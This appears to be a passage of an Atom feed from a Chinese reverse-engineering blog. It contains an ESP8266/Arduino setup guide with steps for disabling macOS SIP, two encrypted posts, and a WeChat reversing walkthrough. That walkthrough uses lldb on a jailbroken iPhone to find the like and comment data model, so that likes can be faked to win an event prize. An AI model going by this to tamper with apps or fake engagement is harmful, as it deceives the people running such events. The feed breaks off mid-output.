    <content type="html"><![CDATA[<h3 id="Arduino-ESP8266开发板上手实践"><a href="#Arduino-ESP8266开发板上手实践" class="headerlink" title="Arduino ESP8266开发板上手实践"></a>Arduino ESP8266开发板上手实践</h3><h4 id="环境搭建（macOS）"><a href="#环境搭建（macOS）" class="headerlink" title="环境搭建（macOS）"></a>环境搭建（macOS）</h4><p>官方说明：<a href="https://github.com/esp8266/Arduino">https://github.com/esp8266/Arduino</a></p><ul><li><p><strong>安装IDE （Arduino IDE）</strong></p><p>下载地址：<a href="https://www.arduino.cc/en/main/software" target="_blank" rel="external">https://www.arduino.cc/en/main/software</a></p><p>还有种方式是利用<a href="https://github.com/plerup/makeEspArduino">Makefile</a>去做开发，这里先做个记录，说不定以后会用这个开发模式，毕竟可控性比较高。但目前还不是很熟悉，建议选择上面的IDE。</p></li></ul><ul><li><p><strong>下载ESP8266硬件包</strong></p><p>1 、在设置里面的附加板管理器网址中增加以下链接<code>https://arduino.esp8266.com/stable/package_esp8266com_index.json</code></p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/Arduino-ESP8266-bigstep/image-20190730143145367.png?raw=true" width="500" hegiht="313" align="center"></p><p>2、在工具中找到你的开发板，然后进入开发板管理器，搜索<strong>esp8266</strong>安装该库，我这里已经安装了。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/Arduino-ESP8266-bigstep/image-20190730143643887.png?raw=true" width="500" hegiht="313" align="center"></p><p>注意：如果这种方式安装不了，你可以选择下载软件包手动安装，这里不展开分析。参考<a href="https://github.com/esp8266/Arduino">这里</a></p></li><li><p><strong>运行示例代码</strong></p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/Arduino-ESP8266-bigstep/image-20190730144157955.png?raw=true" width="500" hegiht="313" align="center"></p><p>我这里打开Blink这个示例代码，这段代码很简单，就是控制LED灯的闪烁。</p><p>代码如下</p><pre><code class="c">/*  ESP8266 Blink by Simon Peter  Blink the blue LED on the ESP-01 module  This example code is in the public domain  The blue LED on the ESP-01 module is connected to GPIO1  (which is also the TXD pin; so we cannot use Serial.print() at the same time)  Note that this sketch uses LED_BUILTIN to find the pin with the internal LED*/void setup() {  pinMode(LED_BUILTIN, OUTPUT);     // Initialize the LED_BUILTIN pin as an output}// the loop function runs over and over again forevervoid loop() {  digitalWrite(LED_BUILTIN, LOW);   // Turn the LED on (Note that LOW is the voltage level  // but actually the LED is on; this is because  // it is active low on the ESP-01)  delay(1000);                      // Wait for a second  digitalWrite(LED_BUILTIN, HIGH);  // Turn the LED off by making the voltage HIGH  delay(2000);                      // Wait for two seconds (to demonstrate the active low LED)}</code></pre><p>在这里点击项目上传，就会编译该Blink项目并上传写入开发板上面运行。如果一切顺利的话，你的开发板的LED灯应该就会开始闪烁了。</p></li></ul><h4 id="重要！！！一些坑以及注意点"><a href="#重要！！！一些坑以及注意点" class="headerlink" title="重要！！！一些坑以及注意点"></a>重要！！！一些坑以及注意点</h4><p>下面说下一切不是很顺利的情况，首先我这里是以mac会开发平台，所以这里都是mac相关的注意事项和问题。</p><p>确定你的端口正常，即电脑是否与开发板正常通信。一般来说你上传代码报错多半是由于端口不可用或者无法找到端口。这里提供几个思路去检查。</p><p>1、确定usb是否连接，这里可以下载一个IORegistryExplorer的工具。<a href="https://developer.apple.com/download/more/" target="_blank" rel="external">下载地址1</a> <a href="https://github.com/vulgo/IORegistryExplorer">下载地址2</a> <a href="https://mac.softpedia.com/get/System-Utilities/IORegistryExplorer.shtml" target="_blank" rel="external">下载地址3</a>在我插入开发板的时候可以看到usb2.0下面多了一个设备，说明能够usb连接正常。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/Arduino-ESP8266-bigstep/image-20190730145128956.png?raw=true" width="500" hegiht="313" align="center"></p><p>2、确定安装了开发板相关的驱动，这个驱动的作用主要就是将设备操作通过<code>Virtual COM Port</code>去通信。这里有几个坑。之前网上能搜到的驱动都不支持最新的macOS系统（10.14）。所以导致我的<code>/dev</code>目录下并没有出现对应的文件。之前的驱动大多是这个<a href="https://github.com/adrianmihalko/ch340g-ch34g-ch34x-mac-os-x-driver">CH340G CH34G CH34X Mac OS X driver</a> 照着里面的步骤，把SIP禁用以及其他都操作了一遍都不行。最后才发现这个驱动可能不支持最新的mac系统，这里我找到一个能够在最新系统正常的驱动下载地址在<a href="https://www.silabs.com/products/development-tools/software/usb-to-uart-bridge-vcp-drivers" target="_blank" rel="external">这里</a>。安装完以后在<code>/dev</code>就应该有一个<code>tty.SLAB_USBtoUART</code>的文件。说明通信的端口已经建立，这时候再IDE中选择该端口。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/Arduino-ESP8266-bigstep/image-20190730145909934.png?raw=true" width="500" hegiht="313" align="center"></p><h4 id="资源链接"><a href="#资源链接" class="headerlink" title="资源链接"></a>资源链接</h4><p>这里我提供一些我在搭建过程中搜到的一些资源，可以参考一下</p><ul><li><p><a href="https://www.arduino.cc/en/guide/macOSX?setlang=cn" target="_blank" rel="external">https://www.arduino.cc/en/guide/macOSX?setlang=cn</a></p><p>在Mac OS X系统上入门Arduino/ Genuino</p></li><li><p><a href="https://juejin.im/post/5b569026e51d4513ee6dd509" target="_blank" rel="external">https://juejin.im/post/5b569026e51d4513ee6dd509</a></p><p>Esp8266+Arduino+Mac开发环境搭建</p></li><li><p><a href="https://www.open-homeautomation.com/2016/06/10/program-an-esp8266-from-arduino-on-macos/" target="_blank" rel="external">https://www.open-homeautomation.com/2016/06/10/program-an-esp8266-from-arduino-on-macos/</a></p><p>Program an ESP8266 from Arduino on MacOS</p></li><li><p><a href="https://github.com/adrianmihalko/ch340g-ch34g-ch34x-mac-os-x-driver">https://github.com/adrianmihalko/ch340g-ch34g-ch34x-mac-os-x-driver</a></p><p>CH340G CH34G CH34X Mac OS X driver</p></li><li><p><a href="http://www.nodemcu.com" target="_blank" rel="external">http://www.nodemcu.com</a></p><p>资料下载访问官网</p></li><li><p><a href="https://pan.baidu.com/s/1ZCjaSJLNpQWL7CPOpkH-dg" target="_blank" rel="external">https://pan.baidu.com/s/1ZCjaSJLNpQWL7CPOpkH-dg</a></p><p>NODEMCU资料</p></li><li><p><a href="http://www.wch.cn/download/CH341SER_MAC_ZIP.html" target="_blank" rel="external">http://www.wch.cn/download/CH341SER_MAC_ZIP.html</a></p><p>mac串口驱动下载地址</p></li><li><p><a href="https://freeware.the-meiers.org/" target="_blank" rel="external">https://freeware.the-meiers.org/</a></p><p>CoolTerm串口监控工具下载</p></li><li><p>SIP禁用步骤</p><pre><code>1. 重启mac，在出现苹果标志和进度条的时候按住 cmd+r2. 终端中输入csrutil disable/status/enabled3. 重启mac</code></pre></li></ul><h4 id="AVR逆向基础"><a href="#AVR逆向基础" class="headerlink" title="AVR逆向基础"></a>AVR逆向基础</h4><p>下面我们就来熟悉一下这个系统，包括代码环境，编译环境，常见库，开发相关。还是以一些demo代码作为学习。</p><p>由于我们主要是研究iOT逆向，所以可能不会关注在实际开发上面。这里先学习下Arduino上面的执行文件格式，以及指令架构等。</p><p>我们通常说的Arduino上面就运行的是一个AVR指令架构的处理器。</p><blockquote><p>AVR refers to the line of MCUs manufactured by Atmel and used in the original designs.</p></blockquote><p>由于ida对这个执行文件的支持不是很好，我们准备用<a href="https://github.com/radare/radare2">radare2</a>来分析这个bin文件。</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><p><a href="https://blog.csdn.net/iotisan/article/details/78766463" target="_blank" rel="external">https://blog.csdn.net/iotisan/article/details/78766463</a></p><p>和ESP8266 Arduino谈场恋爱 01 一条具有中国特色的开发环境安装道路</p></li><li><p><a href="https://www.reddit.com/r/arduino/comments/9jlz5g/any_nodemcu_esp8266_drivers_for_macos_mojave/" target="_blank" rel="external">https://www.reddit.com/r/arduino/comments/9jlz5g/any_nodemcu_esp8266_drivers_for_macos_mojave/</a></p><p>Any NodeMCU esp8266 Drivers for MacOS Mojave?</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Arduino-ESP8266开发板上手实践&quot;&gt;&lt;a href=&quot;#Arduino-ESP8266开发板上手实践&quot; class=&quot;headerlink&quot; title=&quot;Arduino ESP8266开发板上手实践&quot;&gt;&lt;/a&gt;Arduino ESP8266开发板上手
      
    
    </summary>
    
      <category term="IOT" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/IOT/"/>
    
    
      <category term="Arduino" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Arduino/"/>
    
      <category term="IOT" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/IOT/"/>
    
  </entry>
  
  <entry>
    <title>Electron跨平台App实战分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/29/Electron-app-reversing/Electron-app-reversing/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/29/Electron-app-reversing/Electron-app-reversing/</id>
    <published>2019-07-29T03:59:49.000Z</published>
    <updated>2019-07-29T14:45:34.468Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="Electron" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Electron/"/>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
  </entry>
  
  <entry>
    <title>Android完全禁用Accessibility（通杀一切基于此的外挂）</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/24/android-disableAccessibility/android-disableAccessibility/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/24/android-disableAccessibility/android-disableAccessibility/</id>
    <published>2019-07-24T12:02:54.000Z</published>
    <updated>2019-07-30T07:52:20.330Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
      <category term="Accessibility" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Accessibility/"/>
    
  </entry>
  
  <entry>
    <title>微信集赞/评论插件分析及开发</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/22/fkwechatLike/fkwechatLike/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/22/fkwechatLike/fkwechatLike/</id>
    <published>2019-07-22T02:22:01.000Z</published>
    <updated>2019-07-28T13:58:12.611Z</updated>
    
    <content type="html"><![CDATA[<h3 id="微信集赞-评论插件分析及开发"><a href="#微信集赞-评论插件分析及开发" class="headerlink" title="微信集赞/评论插件分析及开发"></a>微信集赞/评论插件分析及开发</h3><h4 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h4><p>为什么要做这个集赞的插件呢？起因是上周去参加了某个会议，有一个集赞60领玩偶的活动，但是想到平时一条朋友圈也就几个赞，而且又不想找人点赞，领不到，很气。回去以后想着能不能写一个集赞的插件，在需要的时候直接输入想要的赞、评论数量，我发的朋友圈就能有多少赞。这样再有这样的活动岂不美哉。准备开干！</p><h4 id="理性分析"><a href="#理性分析" class="headerlink" title="理性分析"></a>理性分析</h4><p>再开始之前，先理性分析一波：如果想要集赞，这里有两种思路，一个是直接在view层去更改，但是这样得去处理界面的一些细节，一旦不注意，很容易崩溃。还有种思路是更改datasource或者说赞评论的模型。可以想到，最初一条朋友圈肯定是从服务器拿到数据并封装成对应的模型。一般来说，越改底层的数据或者说源头的数据，那么稳定性和真实性就更高。这里我的想法就是既不改view层，也不改源头层，就改封装好的模型那一层应该就很符合要求。接下来主要讲一下怎么我去实现这个需求的分析过程，因为本身功能不是很复杂，大佬随便看看就行。</p><h4 id="准备条件"><a href="#准备条件" class="headerlink" title="准备条件"></a>准备条件</h4><ul><li>一台mac</li><li>一台越狱的iOS设备</li><li>ida/Hooper/theos</li><li>flex/issh/xia0LLDB</li><li>其他常见逆向工具等</li></ul><p>对于一贯喜欢上调试器分析得我，所以写了<a href="https://github.com/4ch12dy/issh">iSSH</a>和<a href="https://github.com/4ch12dy/xia0LLDB">xia0LLDB</a>两个工具，在这两个工具的辅助下整个插件用了2小时就完成了逆向分析和代码实现。</p><h4 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h4><h5 id="逆向赞和评论的数据模型"><a href="#逆向赞和评论的数据模型" class="headerlink" title="逆向赞和评论的数据模型"></a>逆向赞和评论的数据模型</h5><p>一切从界面入手，这里分析界面我一般喜欢用flex，在微信的朋友圈界面，用flex很容易发现当前界面的控制器为<code>WCTimeLineViewController</code>而且界面是一个<code>UITableView</code></p><p>将wechat执行文件拖入Hooper（<del>wechat文件太大，ida分析会很卡</del>）找到UITableView的代理方法：<br><code>-[WCTimeLineViewController tableView:cellForRowAtIndexPath:]</code></p><p>这里面肯定会根据模型去设置cell数据</p><pre><code class="objective-c">  r2 = [r28 section];  var_70 = r25;  r24 = [r25 calcDataItemIndex:r2];  r25 = [[MMServiceCenter defaultCenter] retain];  r2 = [WCFacade class];  var_78 = r28;  r0 = [r25 getService:r2];  r0 = [r0 retain];  r24 = [[r0 getTimelineDataItemOfIndex:r24] retain];  [r0 release];  [r25 release];  r19 = [[MMServiceCenter defaultCenter] retain];  r0 = [r19 getService:[WCFacade class]];  r0 = [r0 retain];  r25 = [[r0 getLayerIdForDataItem:r24] retain];  [r0 release];  [r19 release];  r19 = [[MMServiceCenter defaultCenter] retain];  r0 = [r19 getService:[WCFacade class]];  r0 = [r0 retain];  r20 = r0;  r0 = [r0 getShowTip:r24 layerId:r25];  r29 = r29;  r26 = [r0 retain];  [r20 release];  [r19 release];</code></pre><p>整理下来就是</p><p><code>[[MMServiceCenter defaultCenter] getService:[WCFacade class]]</code>会得到一个<code>WCFacade</code>对象，然后通过</p><p><code>[WCFacade getTimelineDataItemOfIndex:]</code>就能得到cell的数据</p><p>看到这里，上调试器！看下都是什么数据…</p><p>将设备用数据线连接上电脑（这里我推荐用数据线的方式，wifi延时太高，影响心情），手机上打开微信</p><p>直接输入<code>issh debug -a wechat</code>就能挂上微信</p><pre><code class="shell">xia0 ~ $ issh debug -a wechat[I]:iproxy process for 2222 port alive, pid=1382[I]:++++++++++++++++++ Nice to Work :) +++++++++++++++++++++[I]:iOSRE dir exist[I]:iproxy process for 1234 port alive, pid=1395[I]:Run ps -e | grep debugserver | grep -v grep; [[ 0 == 0 ]] &amp;&amp; (killall -9 debugserver 2&gt; /dev/null)[I]:/iOSRE/tools/debugserver file exist, Start debug...[I]:Run /iOSRE/tools/debugserver 127.0.0.1:1234 -a wechat</code></pre><p>打开另一个终端进行调试（我的lldb已经安装了xia0LLDB脚本）</p><pre><code>xia0 ~ $ lldb&quot;xutil&quot; command installed -&gt; xutil&quot;choose&quot; command installed -&gt; choose&quot;xbr&quot; command installed --&gt; xbr -[UIView initWithFrame:]&quot;sbt&quot; command installed -&gt; sbt// 连接到远端(lldb) pcc</code></pre><p>这里有两种方法：</p><p>一种是用<code>xbr &quot;-[WCTimeLineViewController tableView:cellForRowAtIndexPath:]&quot;</code>下断点去查看；</p><pre><code>// 对-[WCTimeLineViewController tableView:cellForRowAtIndexPath:]方法下断点(lldb) xbr &quot;-[WCTimeLineViewController tableView:cellForRowAtIndexPath:]&quot;(lldb) c</code></pre><p>第二种是由于lldb支持choose命令，可以直接拿到<code>WCFacade</code>对象。既然如此选choose</p><pre><code>(lldb) choose WCFacade&lt;__NSArrayM 0x2823d9860&gt;(&lt;WCFacade: 0x139e1c030&gt;)</code></pre><p>调用其<code>getTimelineDataItemOfIndex:</code>方法就能拿到第一条朋友圈的数据</p><pre><code>(lldb) po [0x139e1c030 getTimelineDataItemOfIndex:0]Class name: WCDataItem, addr: 0x13e2871d0tid: 13121667995275047007username: wxid_6913ohfkk7kq12createtime: 1564224719commentUsers: ()contentObj: &lt;WCContentItem: 0x2801f5500&gt;</code></pre><p>输入<code>ivars 0x13e2871d0</code>就能拿到对象的所有属性值</p><pre><code>(lldb) ivars 0x13e2871d0&lt;WCDataItem: 0x13e2871d0&gt;:in WCDataItem:    cid (int): 0    tid (NSString*): @&quot;13121667995275047007&quot;    type (int): 0    flag (int): 0    username (NSString*): @&quot;wxid_6913ohfkk7kq12&quot;    nickname (NSString*): @&quot;xia0&quot;    createtime (int): 1564224719    locationInfo (WCLocationInfo*): &lt;WCLocationInfo: 0x2801f7800&gt;    likeFlag (BOOL): NO    likeCount (int): 0    likeUsers (NSMutableArray*): &lt;__NSArrayM: 0x286152d90&gt;    commentCount (int): 0    commentUsers (NSMutableArray*): &lt;__NSArrayM: 0x2861539c0&gt;    contentObj (WCContentItem*): &lt;WCContentItem: 0x2801f5500&gt;    appInfo (WCAppInfo*): &lt;WCAppInfo: 0x287404080&gt;    contentDesc (NSString*): @&quot;test&quot;</code></pre><p>由于属性太多，这里我就只显示了一些比较关心的数据，可以看到这就是我发的一条内容为test的朋友圈。</p><p>里面我们还发现了<code>likeUsers</code>和<code>commentUsers</code>的字段，冷静思考就知道应该就是对应的赞和评论列表。我先给自己点个赞看下里面的数据。</p><pre><code>likeCount (int): 1likeUsers (NSMutableArray*): &lt;__NSArrayM: 0x283e37060&gt;</code></pre><p>发现赞的数量变为1了，在看下里面的内容</p><pre><code>(lldb) po 0x283e37060&lt;__NSArrayM 0x283e37060&gt;(Class name: WCUserCommentusername: wxid_6913ohfkk7kq12nickname: xia0content:source: 0type: 1createTime: 1564225007isLocalAdded: 0commentID: (null)comment64ID: (null)refCommentID: (null)refComment64ID: (null)refUserName:bDeleted: 0)</code></pre><p>正是我自己的微信号。同理可以得到评论</p><pre><code>commentCount (int): 1commentUsers (NSMutableArray*): &lt;__NSArrayM: 0x283e349c0&gt;(lldb) po 0x283e349c0&lt;__NSArrayM 0x283e349c0&gt;(Class name: WCUserCommentusername: 